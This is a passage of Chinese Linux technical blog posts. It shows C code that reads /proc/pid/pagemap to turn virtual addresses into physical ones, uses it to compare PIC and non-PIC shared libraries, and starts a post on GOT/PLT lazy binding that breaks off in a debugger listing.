<p>根据内核文档可知，每个虚拟页在 <code>/proc/pid/pagemap</code> 中对应一项长度为 64 bits 的数据，其中 Bit 63 为 page present，表示物理内存页是否已存在；若物理页已存在，则 Bits 0-54 表示物理页号。此外，需要 root 权限的进程才能读取 <code>/proc/pid/pagemap</code> 中的内容。</p>
<blockquote>
<p>pagemap is a new (as of 2.6.25) set of interfaces in the kernel that allow<br>userspace programs to examine the page tables and related information by<br>reading files in /proc.</p>
<p>There are four components to pagemap:</p>
<p>*/proc/pid/pagemap.  This file lets a userspace process find out which<br>   physical frame each virtual page is mapped to.  It contains one 64-bit<br>   value for each virtual page, containing the following data (from<br>   fs/proc/task_mmu.c, above pagemap_read):<br>  * <font color="red">Bits 0-54  page frame number (PFN) if present</font><br>  * Bits 0-4   swap type if swapped<br>  * Bits 5-54  swap offset if swapped<br>  * Bit  55    pte is soft-dirty (see Documentation/vm/soft-dirty.txt)<br>  * Bit  56    page exclusively mapped (since 4.2)<br>  * Bits 57-60 zero<br>  * Bit  61    page is file-page or shared-anon (since 3.5)<br>  * Bit  62    page swapped<br>  * <font color="red">Bit  63    page present</font>  </p>
<p>  Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs.<br>   In 4.0 and 4.1 opens by unprivileged fail with -EPERM.  <font color="red">Starting from<br>   4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN.</font><br>   Reason: information about PFNs helps in exploiting Rowhammer vulnerability.</p>
</blockquote>
<p>根据以上信息，利用 <code>/proc/pid/pagemap</code> 可将虚拟地址转换为物理地址，具体步骤如下：<br>1）计算虚拟地址所在虚拟页对应的数据项在 <code>/proc/pid/pagmap</code> 中的偏移；<br><code>offset = (viraddr / pagesize) * sizeof(uint64_t)</code><br>2）读取长度为 64 bits 的数据项；<br>3）根据 Bit 63 判断物理内存页是否存在；<br>4）若物理内存页已存在，则取 bits 0 - 54 作为物理页号；<br>5）计算出物理页起始地址加上页内偏移即得到物理地址；<br><code>phyaddr = pageframenum * pagesize + viraddr % pagesize;</code></p>
<p>具体代码实现如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;      </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">size_t</span> virtual_to_physical(<span class="keyword">uint32_t</span> pid, <span class="keyword">size_t</span> viraddr)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> path[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">    <span class="built_in">sprintf</span>(path , <span class="string">"/proc/%d/pagemap"</span>, pid);</div><div class="line">    <span class="keyword">int</span> fd = open(path, O_RDONLY);</div><div class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"open '/proc/self/pagemap' failed!\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">size_t</span> pagesize = getpagesize();</div><div class="line">    <span class="keyword">size_t</span> offset = (viraddr / pagesize) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</div><div class="line">    <span class="keyword">if</span>(lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"lseek() failed!\n"</span>);</div><div class="line">        close(fd);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span> ;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">uint64_t</span> info;</div><div class="line">    <span class="keyword">if</span>(read(fd, &amp;info, <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)) != <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"read() failed!\n"</span>);</div><div class="line">        close(fd);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(info &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>)) == <span class="number">0</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"page is not present!\n"</span>);</div><div class="line">        close(fd);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">size_t</span> pageframenum = info &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">55</span>) <span class="number">-1</span>);</div><div class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * pagesize + viraddr % pagesize;</div><div class="line">    close(fd);</div><div class="line">    <span class="keyword">return</span> phyaddr;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">size_t</span> phyaddr;</div><div class="line">    <span class="keyword">size_t</span> viraddr;</div><div class="line">    <span class="keyword">uint32_t</span> pid;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"pid = "</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%u"</span>, &amp;pid);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"virtual address = "</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%x"</span>, &amp;viraddr);</div><div class="line">    phyaddr = virtual_to_physical(pid, viraddr);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"virtual address = %p,physical address = %p\n"</span>, viraddr, phyaddr);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h1 id="0x02-动态链接"><a href="#0x02-动态链接" class="headerlink" title="0x02 动态链接"></a>0x02 动态链接</h1><p>动态链接在Linux中的实现称为动态共享对象（Dynamic Shared Objects），文件扩展名为 .so；Windows 中为动态链接库（Dynamical Linking Library），文件扩展名为 .dll。</p>
<p>程序与共享对象的链接过程在开始运行程序时由动态链接器完成，之后便开始执行程序。由于共享对象装载到进程空间时的地址不确定，无法在编译阶段进行重定位确定代码中的符号地址。可通过装载时重定位和地址无关代码解决该问题。</p>
<p>通过以下代码说明这两种情况：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">➜  dynamic_link cat Lib.c</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">foobar</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"printing from Lib.so %d\n"</span>,i);</div><div class="line">    sleep(<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line">➜  dynamic_link cat prog1.c</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Lib.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    foobar(<span class="number">1</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="1-装载时重定位"><a href="#1-装载时重定位" class="headerlink" title="1. 装载时重定位"></a>1. 装载时重定位</h2><p>在可执行程序装载时对地址引用进行符号重定位。由于这种方法需要修改指令中的地址，而同一个共享对象在不同进程中的加载地址不同，导致不同的进程必须在内存中有独立的对象模块，无法实现多个进程共用共享对象中的指令。</p>
<p>首先编译生成非地址无关的共享对象 Lib_noPIC.so 以及可执行程序 prog1_noPIC：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc -m32 -shared Lib.c -o Lib_noPIC.so</div><div class="line">gcc -m32 prog1.c -o prog1_noPIC ./Lib_noPIC.so</div></pre></td></tr></table></figure></p>
<p>同时运行两个 prog1_noPIC 进程，并查看其进程虚拟内存空间分布如下，可以看到两个进程的虚拟地址空间分布是相同的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">➜  dynamic_link pidof prog1_noPIC</div><div class="line"><span class="number">18365</span> <span class="number">18364</span></div><div class="line">➜  dynamic_link cat /proc/<span class="number">18365</span>/maps</div><div class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">787009</span>                             /home/lc/Load/dynamic_link/prog1_noPIC</div><div class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">787009</span>                             /home/lc/Load/dynamic_link/prog1_noPIC</div><div class="line"><span class="number">0804</span>a000<span class="number">-0804</span>b000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">787009</span>                             /home/lc/Load/dynamic_link/prog1_noPIC</div><div class="line"><span class="number">0804</span>b000<span class="number">-0806</span>c000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                                  [heap]</div><div class="line">f7e00000-f7e01000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></div><div class="line">f7e01000-f7fb1000 r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">935035</span>                             /lib/i386-linux-gnu/libc<span class="number">-2.23</span>.so</div><div class="line">f7fb1000-f7fb3000 r--p <span class="number">001</span>af000 <span class="number">08</span>:<span class="number">01</span> <span class="number">935035</span>                             /lib/i386-linux-gnu/libc<span class="number">-2.23</span>.so</div><div class="line">f7fb3000-f7fb4000 rw-p <span class="number">001</span>b1000 <span class="number">08</span>:<span class="number">01</span> <span class="number">935035</span>                             /lib/i386-linux-gnu/libc<span class="number">-2.23</span>.so</div><div class="line">f7fb4000-f7fb7000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></div><div class="line">f7fd0000-f7fd1000 r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">793527</span>                             /home/lc/Load/dynamic_link/Lib_noPIC.so</div><div class="line">f7fd1000-f7fd2000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">793527</span>                             /home/lc/Load/dynamic_link/Lib_noPIC.so</div><div class="line">f7fd2000-f7fd3000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">793527</span>                             /home/lc/Load/dynamic_link/Lib_noPIC.so</div><div class="line">...</div><div class="line">➜  dynamic_link cat /proc/<span class="number">18364</span>/maps</div><div class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">787009</span>                             /home/lc/Load/dynamic_link/prog1_noPIC</div><div class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">787009</span>                             /home/lc/Load/dynamic_link/prog1_noPIC</div><div class="line"><span class="number">0804</span>a000<span class="number">-0804</span>b000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">787009</span>                             /home/lc/Load/dynamic_link/prog1_noPIC</div><div class="line"><span class="number">0804</span>b000<span class="number">-0806</span>c000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                                  [heap]</div><div class="line">f7e00000-f7e01000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></div><div class="line">f7e01000-f7fb1000 r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">935035</span>                             /lib/i386-linux-gnu/libc<span class="number">-2.23</span>.so</div><div class="line">f7fb1000-f7fb3000 r--p <span class="number">001</span>af000 <span class="number">08</span>:<span class="number">01</span> <span class="number">935035</span>                             /lib/i386-linux-gnu/libc<span class="number">-2.23</span>.so</div><div class="line">f7fb3000-f7fb4000 rw-p <span class="number">001</span>b1000 <span class="number">08</span>:<span class="number">01</span> <span class="number">935035</span>                             /lib/i386-linux-gnu/libc<span class="number">-2.23</span>.so</div><div class="line">f7fb4000-f7fb7000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></div><div class="line">f7fd0000-f7fd1000 r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">793527</span>                             /home/lc/Load/dynamic_link/Lib_noPIC.so</div><div class="line">f7fd1000-f7fd2000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">793527</span>                             /home/lc/Load/dynamic_link/Lib_noPIC.so</div><div class="line">f7fd2000-f7fd3000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">793527</span>                             /home/lc/Load/dynamic_link/Lib_noPIC.so</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>根据 0xf7fd0000-0xf7fd1000 地址段内存的可执行权限可知该段为 Lib_noPIC.so 代码内存区域，下面通过查看代码段中的虚拟地址对应的物理地址是否相同，以验证不同进程是否共享物理内存中同一个 Lib_noPIC.so 的代码段。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜  dynamic_link pidof prog1_noPIC</div><div class="line"><span class="number">18365</span> <span class="number">18364</span></div><div class="line">➜  dynamic_link sudo ./virtual_to_physical</div><div class="line">pid = <span class="number">18365</span></div><div class="line">virtual address = f7fd0005</div><div class="line">virtual address = <span class="number">0xf7fd0005</span>,physical address = <span class="number">0x6b7ea005</span></div><div class="line">➜  dynamic_link sudo ./virtual_to_physical</div><div class="line">pid = <span class="number">18364</span></div><div class="line">virtual address = f7fd0005</div><div class="line">virtual address = <span class="number">0xf7fd0005</span>,physical address = <span class="number">0x2e2cc005</span></div></pre></td></tr></table></figure></p>
<p>从结果中可看到，不同进程中 0xf7fd0005 对应的物理内存分别为 0x6b7ea005 和 0x2e2cc005。由此说明非地址无关的共享对象中的代码段无法被不同进程共用。</p>
<h2 id="2-地址无关代码"><a href="#2-地址无关代码" class="headerlink" title="2. 地址无关代码"></a>2. 地址无关代码</h2><p>地址无关代码 PIC（Position-Independent Code）把与地址相关的部分放入到数据段的全局偏移表 GOT（Global Offset Table）中，这样指令部分可保持不变，<a href="http://0x4c43.cn/2018/0429/linux-lazy-binding-mechanism/">重定位时只需修改 GOT</a>，而数据部分可在每个进程中拥有一个副本，从而实现共用共享对象的指令部分。</p>
<p>使用以下命令编译生成地址无关的共享对象 Lib_PIC.so 以及可执行程序 prog1_PIC：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc -m32 -fPIC -shared Lib.c -o Lib_PIC.so</div><div class="line">gcc -m32 prog1.c -o prog1_PIC ./Lib_PIC.so</div></pre></td></tr></table></figure></p>
<p>同时运行两个 prog1_PIC 进程，查看其进程虚拟内存空间分布如下，可以看到两个进程的虚拟地址空间分布也是相同的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">➜  dynamic_link pidof prog1_PIC  </div><div class="line"><span class="number">19118</span> <span class="number">19113</span></div><div class="line">➜  dynamic_link cat /proc/<span class="number">19118</span>/maps</div><div class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">787010</span>                             /home/lc/Load/dynamic_link/prog1_PIC</div><div class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">787010</span>                             /home/lc/Load/dynamic_link/prog1_PIC</div><div class="line"><span class="number">0804</span>a000<span class="number">-0804</span>b000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">787010</span>                             /home/lc/Load/dynamic_link/prog1_PIC</div><div class="line"><span class="number">0804</span>b000<span class="number">-0806</span>c000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                                  [heap]</div><div class="line">f7e00000-f7e01000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></div><div class="line">f7e01000-f7fb1000 r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">935035</span>                             /lib/i386-linux-gnu/libc<span class="number">-2.23</span>.so</div><div class="line">f7fb1000-f7fb3000 r--p <span class="number">001</span>af000 <span class="number">08</span>:<span class="number">01</span> <span class="number">935035</span>                             /lib/i386-linux-gnu/libc<span class="number">-2.23</span>.so</div><div class="line">f7fb3000-f7fb4000 rw-p <span class="number">001</span>b1000 <span class="number">08</span>:<span class="number">01</span> <span class="number">935035</span>                             /lib/i386-linux-gnu/libc<span class="number">-2.23</span>.so</div><div class="line">f7fb4000-f7fb7000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></div><div class="line">f7fd0000-f7fd1000 r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">793524</span>                             /home/lc/Load/dynamic_link/Lib_PIC.so</div><div class="line">f7fd1000-f7fd2000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">793524</span>                             /home/lc/Load/dynamic_link/Lib_PIC.so</div><div class="line">f7fd2000-f7fd3000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">793524</span>                             /home/lc/Load/dynamic_link/Lib_PIC.so</div><div class="line">...</div><div class="line">➜  dynamic_link cat /proc/<span class="number">19113</span>/maps</div><div class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">787010</span>                             /home/lc/Load/dynamic_link/prog1_PIC</div><div class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">787010</span>                             /home/lc/Load/dynamic_link/prog1_PIC</div><div class="line"><span class="number">0804</span>a000<span class="number">-0804</span>b000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">787010</span>                             /home/lc/Load/dynamic_link/prog1_PIC</div><div class="line"><span class="number">0804</span>b000<span class="number">-0806</span>c000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                                  [heap]</div><div class="line">f7e00000-f7e01000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></div><div class="line">f7e01000-f7fb1000 r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">935035</span>                             /lib/i386-linux-gnu/libc<span class="number">-2.23</span>.so</div><div class="line">f7fb1000-f7fb3000 r--p <span class="number">001</span>af000 <span class="number">08</span>:<span class="number">01</span> <span class="number">935035</span>                             /lib/i386-linux-gnu/libc<span class="number">-2.23</span>.so</div><div class="line">f7fb3000-f7fb4000 rw-p <span class="number">001</span>b1000 <span class="number">08</span>:<span class="number">01</span> <span class="number">935035</span>                             /lib/i386-linux-gnu/libc<span class="number">-2.23</span>.so</div><div class="line">f7fb4000-f7fb7000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></div><div class="line">f7fd0000-f7fd1000 r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">793524</span>                             /home/lc/Load/dynamic_link/Lib_PIC.so</div><div class="line">f7fd1000-f7fd2000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">793524</span>                             /home/lc/Load/dynamic_link/Lib_PIC.so</div><div class="line">f7fd2000-f7fd3000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">793524</span>                             /home/lc/Load/dynamic_link/Lib_PIC.so</div></pre></td></tr></table></figure></p>
<p>查看不同进程中 Lib_PIC.so 代码内存区域中的虚拟地址 0xf7fd0005 对应的物理内存地址，结果显示都为 0x2464e005。表明地址无关共享对象中的代码段可供不同进程共同使用，从而可节省内存空间。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜  dynamic_link pidof prog1_PIC           </div><div class="line"><span class="number">19118</span> <span class="number">19113</span></div><div class="line">➜  dynamic_link sudo ./virtual_to_physical</div><div class="line">pid = <span class="number">19118</span></div><div class="line">virtual address = f7fd0005</div><div class="line">virtual address = <span class="number">0xf7fd0005</span>,physical address = <span class="number">0x2464e005</span></div><div class="line">➜  dynamic_link sudo ./virtual_to_physical</div><div class="line">pid = <span class="number">19113</span></div><div class="line">virtual address = f7fd0005</div><div class="line">virtual address = <span class="number">0xf7fd0005</span>,physical address = <span class="number">0x2464e005</span></div></pre></td></tr></table></figure></p>
<p>此外，共享对象的数据段在每个进程中都有独立的副本，以确保不同进程对数据的读写不影响其他进程。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">➜  dynamic_link sudo ./virtual_to_physical</div><div class="line">pid = <span class="number">19118</span></div><div class="line">virtual address = f7fd1005</div><div class="line">virtual address = <span class="number">0xf7fd1005</span>,physical address = <span class="number">0x105b6005</span></div><div class="line">➜  dynamic_link sudo ./virtual_to_physical</div><div class="line">pid = <span class="number">19113</span></div><div class="line">virtual address = f7fd1005</div><div class="line">virtual address = <span class="number">0xf7fd1005</span>,physical address = <span class="number">0x6cd47005</span></div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="https://zhoujianshi.github.io/articles/2017/Linux%20%E8%8E%B7%E5%8F%96%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%AF%B9%E5%BA%94%E7%9A%84%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80/index.html" target="_blank" rel="external">Linux 获取虚拟地址对应的物理地址 </a><br>[2] 《程序员的自我修养》</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Memory Address </tag>
            
            <tag> dynamic Linking </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux 延迟绑定机制]]></title>
      <url>/2018/0429/linux-lazy-binding-mechanism/</url>
      <content type="html"><![CDATA[<p>如果使用动态链接方式生成的程序模块中使用大量的函数引用，在程序执行时会花费大量的时间用于模块间函数引用的符号查找和重定位，导致程序性能下降。由于程序中可能存在部分不常用的功能模块，那么在程序开始执行时就完成所有函数的链接工作将会是一种浪费。因此，Linux 系统采用延迟绑定机制优化动态链接程序的符号重定位过程。</p>
<h1 id="0x01-延迟绑定原理"><a href="#0x01-延迟绑定原理" class="headerlink" title="0x01 延迟绑定原理"></a>0x01 延迟绑定原理</h1><p>延迟绑定是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数不被调用就不进行绑定。延迟绑定机制可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序。</p>
<blockquote>
<p>GOT（Global Offset Table，全局偏移表）<br>GOT 是数据段用于地址无关代码的 Linux ELF 文件中确定全局变量和外部函数地址的表。ELF 中有 .got 和 .plt.got 两个 GOT 表，.got 表用于全局变量的引用地址，.got.plt 用于保存函数引用的地址。  </p>
<p>PLT（Procedure Linkage Table，程序链接表）<br>PLT 是 Linux ELF 文件中用于延迟绑定的表。</p>
</blockquote>
<p>下面介绍延迟绑定的基本原理。假设程序中调用 func 函数，该函数在 .plt 段中相应的项为 func@plt，在 .got.plt 中相应的项为 func@got，链接器在初始化时将 func@got 中的值填充为 “preapre resolver” 指令处的地址。func@plt 的伪代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">func@plt:</div><div class="line">jmp *(func@got)</div><div class="line">prepare resolver</div><div class="line">jmp _dl_runtime_resolve</div></pre></td></tr></table></figure></p>
<h2 id="1-首次调用"><a href="#1-首次调用" class="headerlink" title="1. 首次调用"></a>1. 首次调用</h2><p>第一次调用 func 函数时，首先会跳转到 PLT 执行 <code>jmp *(func@got)</code>，由于该函数没被调用过，func@got 中的值不是 func 函数的地址，而是 PLT 中的 “preapre resolver” 指令的地址，所以会跳转到 “preapre resolver” 执行，接着会调用 _dl_runtime_resolve 解析 func 函数的地址，并将该函数真正的地址填充到 func@got，最后跳转到 func 函数继续执行代码。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-29/78087498.jpg" alt="">    </p>
<h2 id="2-非首次调用"><a href="#2-非首次调用" class="headerlink" title="2. 非首次调用"></a>2. 非首次调用</h2><p>当再次调用 func 函数时，由于 func@got 中已填充正确的函数地址，此时执行 PLT 中的 <code>jmp *(func@got)</code> 即可成功跳转到 func 函数中执行。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-29/26402902.jpg" alt="">    </p>
<h1 id="0x02-实例调试"><a href="#0x02-实例调试" class="headerlink" title="0x02 实例调试"></a>0x02 实例调试</h1><p>下面通过调试程序中 func 函数的调用过程说明延迟绑定的原理。首先函数执行 call 指令调用 func 函数时会跳转到 0x8048420（func@plt）处执行。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   <span class="number">0x8048546</span> &lt;main+<span class="number">11</span>&gt;: mov    ebp,esp</div><div class="line">   <span class="number">0x8048548</span> &lt;main+<span class="number">13</span>&gt;: push   ecx</div><div class="line">   <span class="number">0x8048549</span> &lt;main+<span class="number">14</span>&gt;: sub    esp,<span class="number">0x4</span></div><div class="line">=&gt; <span class="number">0x804854c</span> &lt;main+<span class="number">17</span>&gt;: call   <span class="number">0x8048420</span> &lt;func@plt&gt;</div><div class="line">   <span class="number">0x8048551</span> &lt;main+<span class="number">22</span>&gt;: nop</div><div class="line">   <span class="number">0x8048552</span> &lt;main+<span class="number">23</span>&gt;: add    esp,<span class="number">0x4</span></div><div class="line">   <span class="number">0x8048555</span> &lt;main+<span class="number">26</span>&gt;: pop    ecx</div><div class="line">   <span class="number">0x8048556</span> &lt;main+<span 